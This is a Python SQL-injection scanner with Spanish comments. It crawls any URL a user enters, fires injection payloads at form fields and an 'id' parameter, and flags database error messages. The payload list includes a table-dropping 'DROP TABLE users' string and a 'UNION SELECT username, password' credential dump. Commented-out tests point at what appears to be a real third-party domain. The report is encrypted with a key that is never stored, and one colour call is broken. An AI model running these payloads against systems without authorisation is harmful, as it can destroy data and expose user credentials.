import requests
import re
import os
import unittest
from urllib.parse import urlparse, urljoin
from datetime import datetime
from colorama import init, Fore, Style
from cryptography.fernet import Fernet

# Inicializar colorama
init()

# Definir el directorio donde se almacenarán los reportes
REPORT_DIRECTORY = "reportes_vulnerabilidades_Critica"
os.makedirs(REPORT_DIRECTORY, exist_ok=True)

# Payloads para inyección SQL
PAYLOADS = [
    "' OR '1'='1", '" OR "1"="1', "' OR 1=1--", '" OR 1=1--',
    "' AND '1'='2", '" AND "1"="2',
    "'; DROP TABLE users; --", "' UNION SELECT NULL, NULL --",
    "' UNION SELECT username, password FROM users --",
    "' AND SLEEP(5) --", '" AND SLEEP(5) --', "' OR SLEEP(5) #",
    "' OR IF(1=1, SLEEP(5), 0) --"
]

# Palabras clave para detectar errores de SQL
ERROR_KEYWORDS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql error",
    "database error",
    "ORA-",
    "syntax error",
    "unknown column",
    "mysql_fetch",
    "pg_query"
]

# Lista de vulnerabilidades detectadas
vulnerabilities_detected = []
visited_urls = set()


# ------------------------ FUNCIONES PRINCIPALES ------------------------

def get_user_url():
    """Solicita al usuario que ingrese la URL a analizar."""
    url = input("Ingrese la URL a analizar: ").strip()
    if not url.startswith(("http://", "https://")):
        print(f"{Fore.RED}Error: La URL debe comenzar con http:// o https://{Style.reset_all}")
        return None
    return url


def extract_internal_links(url):
    """Extrae los enlaces internos de una página."""
    internal_links = set()
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            page_content = response.text
            base_url = get_base_url(url)
            links = re.findall(r'href=[\'"](.*?)[\'"]', page_content, flags=re.IGNORECASE)
            for link in links:
                absolute_link = urljoin(base_url, link.strip())
                if is_same_domain(absolute_link, base_url):
                    internal_links.add(absolute_link)
    except requests.RequestException:
        pass
    return internal_links


def get_base_url(url):
    """Obtiene la base de la URL."""
    parsed_url = urlparse(url)
    return f"{parsed_url.scheme}://{parsed_url.netloc}"


def is_same_domain(url, base_url):
    """Verifica si la URL pertenece al mismo dominio."""
    return urlparse(url).netloc == urlparse(base_url).netloc


def is_sql_vulnerable(response_text):
    """Detecta si una respuesta contiene indicios de inyección SQL."""
    return any(keyword in response_text.lower() for keyword in ERROR_KEYWORDS)


def perform_sql_injection_checks(url):
    """Realiza pruebas de inyección SQL en formularios y parámetros de la URL."""
    try:
        response = requests.get(url, timeout=5)
        print(f"{Fore.CYAN}Verificando: {url} (HTTP {response.status_code}){Style.RESET_ALL}")
        if response.status_code != 200:
            return

        page_content = response.text
        input_fields = re.findall(r'<input.*?name=["\'](.*?)["\']', page_content, flags=re.IGNORECASE)
        forms = re.findall(r'<form.*?action=["\'](.*?)["\']', page_content, flags=re.IGNORECASE)

        for form in forms:
            form_action = urljoin(url, form)
            for input_name in input_fields:
                for payload in PAYLOADS:
                    try:
                        data = {input_name: payload}
                        response = requests.post(form_action, data=data, timeout=5)
                        if is_sql_vulnerable(response.text):
                            vulnerabilities_detected.append(f"- {form_action} ({input_name}): {payload}")
                            print(f"{Fore.RED}Vulnerabilidad detectada en formulario: {form_action}{Style.RESET_ALL}")
                            break
                    except requests.RequestException:
                        pass

        for payload in PAYLOADS:
            test_url = f"{url}?id={payload}"
            try:
                response = requests.get(test_url, timeout=5)
                if is_sql_vulnerable(response.text):
                    vulnerabilities_detected.append(f"- {test_url}: {payload}")
                    print(f"{Fore.RED}Vulnerabilidad detectada en URL: {test_url}{Style.RESET_ALL}")
                    break
            except requests.RequestException:
                pass

    except requests.RequestException:
        print(f"{Fore.YELLOW}Error al analizar: {url}{Style.RESET_ALL}")


def generate_report(url):
    """Genera un reporte en HTML con las vulnerabilidades detectadas."""
    if vulnerabilities_detected:
        filename = f"Inyección_SQL_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.html"
        file_path = os.path.join(REPORT_DIRECTORY, filename)
        key = Fernet.generate_key()
        cipher = Fernet(key)

        with open(file_path, 'w', encoding='utf-8') as file:
            file.write("<!DOCTYPE html>\n<html lang='es'>\n<head>\n<meta charset='UTF-8'>\n")
            file.write("<title>Reporte de Vulnerabilidades Critica</title></head><body>")
            file.write("=" * 150 + "\n\n")
            file.write("<h1 style='text-align:center;'>Reporte de Inyección SQL</h1>")
            file.write("=" * 150 + "\n\n")
            file.write(f"<p>URL Analizada: {url}</p>")
            file.write(f"<p>Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>")
            file.write("<h2>Vulnerabilidades Detectadas</h2><ul>")
            for vulnerability in vulnerabilities_detected:
                file.write(f"<li><pre>{vulnerability}</pre></li>")
            file.write("</ul></body></html>")

        with open(file_path, 'rb') as f:
            encrypted_data = cipher.encrypt(f.read())
        with open(file_path + ".enc", 'wb') as f:
            f.write(encrypted_data)

        print(f"{Fore.LIGHTMAGENTA_EX}Reporte generado y encriptado en {file_path}.enc{Style.RESET_ALL}")

    else:
        return print(f"\n{Fore.GREEN}No se detectaron vulnerabilidades.{Style.RESET_ALL}")


# ------------------------ PRUEBAS UNITARIAS ------------------------
#
# class TestSQLInjectionScanner(unittest.TestCase):
#
#     def test_base_url_extraction(self):
#         """Prueba la extracción de la base de la URL."""
#         self.assertEqual(get_base_url("https://client.assist.com.uy/path"), "https://client.assist.com.uy")
#
#     def test_internal_links_extraction(self):
#         """Prueba la extracción de enlaces internos."""
#         test_url = "https://client.assist.com.uy/"
#         extracted_links = extract_internal_links(test_url)
#         self.assertIsInstance(extracted_links, set)
#
#     def test_sql_vulnerability_detection(self):
#         """Prueba la detección de errores de SQL."""
#         error_response = "You have an error in your SQL syntax near"
#         safe_response = "Welcome to our website!"
#         self.assertTrue(is_sql_vulnerable(error_response))
#         self.assertFalse(is_sql_vulnerable(safe_response))
#
#
# ------------------------ EJECUCIÓN PRINCIPAL ------------------------

if __name__ == "__main__":
    user_url = get_user_url()
    if user_url:
        perform_sql_injection_checks(user_url)
        generate_report(user_url)
        unittest.main(exit=False)
